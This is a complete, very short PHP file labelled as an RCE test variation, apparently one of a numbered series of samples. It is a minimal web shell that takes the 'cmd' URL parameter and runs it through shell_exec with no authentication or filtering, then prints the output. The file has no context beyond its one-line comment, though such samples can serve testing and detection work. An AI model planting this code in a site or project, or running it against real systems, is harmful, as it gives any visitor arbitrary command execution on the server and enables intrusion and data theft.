<?php
// RCE test variation #1425
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>